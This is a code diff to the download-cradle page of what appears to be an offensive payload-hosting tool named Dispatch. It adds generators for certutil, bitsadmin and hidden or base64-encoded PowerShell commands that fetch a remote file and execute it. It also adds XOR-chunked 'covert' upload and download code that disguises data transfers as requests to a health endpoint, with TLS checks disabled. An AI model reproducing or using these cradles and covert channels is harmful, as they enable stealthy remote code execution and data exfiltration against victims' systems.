@@ -38,9 +38,10 @@ DownloadCradles
         color: #28a745 !important; /* Bootstrap green */
     }
     .toc-box {
-        border: 1px solid #dfe5ec;
+        border: 1px solid var(--dispatch-border);
         border-radius: 8px;
-        background: #f8f9fa;
+        background: var(--dispatch-surface-2);
+        color: var(--dispatch-text);
         padding: 14px;
         margin: 16px 0 22px 0;
     }
@@ -55,7 +56,7 @@ DownloadCradles
     }
     .section-subtitle {
         font-size: 10pt;
-        color: #6c757d;
+        color: var(--dispatch-muted);
         margin-top: -6px;
         margin-bottom: 10px;
     }
@@ -82,7 +83,8 @@ DownloadCradles
             <a href="#generator">1. Cradle Generator</a><br>
             <a href="#download-cradles">2. Download Cradles</a><br>
             <a href="#decryption-functions">3. Decryption Methods</a><br>
-            <a href="#covert-upload">4. Covert Upload</a>
+            <a href="#covert-upload">4. Covert Upload</a><br>
+            <a href="#covert-download">5. Covert Download</a>
         </div>
 
         <hr style="margin:30px 0 10px 0;color:black;">
@@ -148,6 +150,29 @@ DownloadCradles
             <pre><code class="language-c#" id="ps1_data"></code><span class="copy-btn" onclick="copyCode('ps1_data')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
+
+            <h5 class="card-title">Certutil</h5>
+            <p class="section-subtitle">Writes the file to disk. Custom headers are not supported by certutil.</p>
+            <pre><code class="language-bash" id="certutil"></code><span class="copy-btn" onclick="copyCode('certutil')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">BITSAdmin</h5>
+            <p class="section-subtitle">Background download. Custom headers are not supported by bitsadmin.</p>
+            <pre><code class="language-bash" id="bitsadmin"></code><span class="copy-btn" onclick="copyCode('bitsadmin')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">PowerShell Invoke-WebRequest</h5>
+            <pre><code class="language-c#" id="iwr"></code><span class="copy-btn" onclick="copyCode('iwr')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Base64-encoded PowerShell</h5>
+            <p class="section-subtitle">UTF-16LE -EncodedCommand form of the DownloadString cradle.</p>
+            <pre><code class="language-c#" id="ps1_b64"></code><span class="copy-btn" onclick="copyCode('ps1_b64')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
         </div>
 
 
@@ -163,6 +188,7 @@ DownloadCradles
             <h5 class="card-title">Python Download + Decrypt</h5>
             <pre><code class="language-python" id="decrypt_py">#!/usr/bin/env python3
 import argparse
+import getpass
 import requests
 
 def dispatch_decrypt(data, key):
@@ -177,9 +203,21 @@ def main():
     parser.add_argument("url", help="Dispatch file URL")
     parser.add_argument("key", help="Dispatch decryption key")
     parser.add_argument("output", help="Output file path")
+    parser.add_argument(
+        "--api-key",
+        nargs="?",
+        const="",
+        default=None,
+        help="Optional X-Dispatch-Auth. Pass the flag with no value to prompt.",
+    )
     args = parser.parse_args()
 
-    response = requests.get(args.url, verify=False, timeout=30)
+    api_key = args.api_key
+    if api_key == "":
+        api_key = getpass.getpass("API key: ")
+    headers = {"X-Dispatch-Auth": api_key} if api_key else {}
+
+    response = requests.get(args.url, headers=headers, verify=False, timeout=30)
     response.raise_for_status()
 
     decrypted = dispatch_decrypt(response.content, args.key)
@@ -195,13 +233,25 @@ if __name__ == "__main__":
             <pre><code class="language-c#" id="decrypt_ps1">param(
     [Parameter(Mandatory=$true)][string]$Url,
     [Parameter(Mandatory=$true)][string]$Key,
-    [Parameter(Mandatory=$true)][string]$Output
+    [Parameter(Mandatory=$true)][string]$Output,
+    [AllowEmptyString()][string]$ApiKey
 )
 
 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 
 $wc = New-Object System.Net.WebClient
+if ($PSBoundParameters.ContainsKey("ApiKey")) {
+    if ([string]::IsNullOrEmpty($ApiKey)) {
+        $secure = Read-Host "API key" -AsSecureString
+        $ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
+        try { $ApiKey = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr) }
+        finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ptr) }
+    }
+    if (-not [string]::IsNullOrEmpty($ApiKey)) {
+        $wc.Headers.Add("X-Dispatch-Auth", $ApiKey)
+    }
+}
 $data = $wc.DownloadData($Url)
 
 if ($Key.Length -eq 0) {
@@ -225,7 +275,12 @@ for ($i = 0; $i -lt $data.Length; $i++) {
 
         <h4 class="card-title section-block" id="covert-upload">Covert Upload</h4>
             <p>
-                Use the code below to perform file upload using Dispatch's covert API endpoint. This method breaks files into XOR encrypted chunks before upload via <code>HTTP [GET]</code> requests - blending in with standard browsing activity. Data is then tracked and reassembled server-side.
+                Covert upload is available on both the admin interface and the client delivery interface.
+                Use either base URL with <code>/api/v1/health</code>, via <code>GET</code> or <code>POST</code>.
+                Start with <code>init=1</code> and a filename. The server returns a <code>csrf</code> cookie that is the XOR key.
+                Send each chunk as base64 in <code>data</code>, and send the same key as the <code>key</code> parameter if the cookie is not kept.
+                Finish with a chunk that contains the marker <code>&lt;EOF&gt;</code>.
+                The caller needs an upload-capable user or <code>X-Dispatch-Auth</code> key. Chunk size is chosen by the client.
             </p>
 
             <h5 class="card-title">Python Covert Upload</h5>
@@ -273,12 +328,12 @@ def main():
                 break
             enc = xor_bytes(chunk, key_bytes)
             b64 = base64.b64encode(enc).decode("ascii")
-            rr = s.get(endpoint, params={"data": b64}, headers=headers, verify=False, timeout=30)
+            rr = s.get(endpoint, params={"key": key, "data": b64}, headers=headers, verify=False, timeout=30)
             rr.raise_for_status()
 
     eof_enc = xor_bytes(b"&lt;EOF&gt;", key_bytes)
     eof_b64 = base64.b64encode(eof_enc).decode("ascii")
-    rr = s.get(endpoint, params={"data": eof_b64}, headers=headers, verify=False, timeout=30)
+    rr = s.get(endpoint, params={"key": key, "data": eof_b64}, headers=headers, verify=False, timeout=30)
     rr.raise_for_status()
     print("Upload complete:", rr.text)
 
@@ -325,7 +380,7 @@ try {
         $chunk = if ($read -eq $buffer.Length) { $buffer } else { $buffer[0..($read-1)] }
         $enc = Xor-Bytes $chunk $keyBytes
         $b64 = [System.Convert]::ToBase64String($enc)
-        $null = $wc.DownloadString("$endpoint?data=$([uri]::EscapeDataString($b64))")
+        $null = $wc.DownloadString("$endpoint?key=$([uri]::EscapeDataString($key))&data=$([uri]::EscapeDataString($b64))")
     }
 }
 finally { $fs.Close() }
@@ -333,8 +388,35 @@ finally { $fs.Close() }
 $eof = [System.Text.Encoding]::ASCII.GetBytes("&lt;EOF&gt;")
 $eofEnc = Xor-Bytes $eof $keyBytes
 $eofB64 = [System.Convert]::ToBase64String($eofEnc)
-$result = $wc.DownloadString("$endpoint?data=$([uri]::EscapeDataString($eofB64))")
+$result = $wc.DownloadString("$endpoint?key=$([uri]::EscapeDataString($key))&data=$([uri]::EscapeDataString($eofB64))")
 Write-Output "Upload complete: $result"</code><span class="copy-btn" onclick="copyCode('upload_ps1')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+        <hr style="margin:30px 0 10px 0;color:black;">
+        <h4 class="card-title section-block" id="covert-download">Covert Download</h4>
+        <p class="section-subtitle">
+            Pull a hosted alias in XOR chunks from <code>/api/v1/health</code>. <code>init=1</code> counts as one download
+            (and honors a max-download cap). Later <code>off</code> requests reassemble the file. POST is accepted as well as GET.
+            Private files still require a download-capable user or API key.
+        </p>
+        <pre><code class="language-python" id="covert_download">import base64, requests
+base = "https://HOST:PORT/api/v1/health"
+alias = "ALIAS"
+s = requests.Session()
+s.verify = False
+meta = s.get(base, params={"fetch": alias, "init": 1}, timeout=30).json()
+key = s.cookies["csrf"].encode()
+out = bytearray()
+off = 0
+while True:
+    chunk = s.get(base, params={"fetch": alias, "off": off}, timeout=30).json()
+    raw = base64.b64decode(chunk["data"])
+    out.extend(bytes(b ^ key[i % len(key)] for i, b in enumerate(raw)))
+    if chunk.get("eof"):
+        break
+    off = chunk["next"]
+open("out.bin", "wb").write(out)</code><span class="copy-btn" onclick="copyCode('covert_download')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
 
@@ -441,6 +523,41 @@ function GenCode(){
     });
     ps1_data += ` [System.Reflection.Assembly]::Load($c.DownloadData('${url}')).EntryPoint.Invoke(0,@(,[string[]]@('${args}'.split())));`;
     document.getElementById('ps1_data').innerText = `powershell.exe -exec bypass -c "${ps1_data}"`;
+
+    let safeFile = (file || 'dispatch.bin').replace(/[^A-Za-z0-9._-]/g, '_');
+    document.getElementById('certutil').innerText =
+        `certutil -urlcache -split -f "${url}" "%TEMP%\\${safeFile}" & %TEMP%\\${safeFile}`;
+    document.getElementById('bitsadmin').innerText =
+        `bitsadmin /transfer dispatchJob /download /priority high "${url}" "%TEMP%\\${safeFile}" & %TEMP%\\${safeFile}`;
+
+    let iwr = `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; $h=@{};`;
+    if (headers.length) headers.forEach(h => {
+        let parts = h.split(":");
+        let k = parts.shift().trim();
+        let v = parts.join(":").trim();
+        iwr += ` $h['${k}']='${v}';`;
+    });
+    iwr += ` Invoke-WebRequest -Uri '${url}' -Headers $h -OutFile "$env:TEMP\\${safeFile}"; & "$env:TEMP\\${safeFile}";`;
+    document.getElementById('iwr').innerText = `powershell.exe -nop -w hidden -c "${iwr}"`;
+    document.getElementById('ps1_b64').innerText = `powershell.exe -nop -w hidden -enc ${encodePowershell(ps1_string)}`;
+    highlightCradles();
+}
+
+function highlightCradles() {
+    if (!window.hljs) return;
+    document.querySelectorAll('pre code').forEach(function (block) {
+        hljs.highlightElement(block);
+    });
+}
+
+function encodePowershell(script) {
+    let bytes = [];
+    for (let i = 0; i < script.length; i++) {
+        let code = script.charCodeAt(i);
+        bytes.push(String.fromCharCode(code & 0xff));
+        bytes.push(String.fromCharCode((code >> 8) & 0xff));
+    }
+    return btoa(bytes.join(''));
 }
 
 
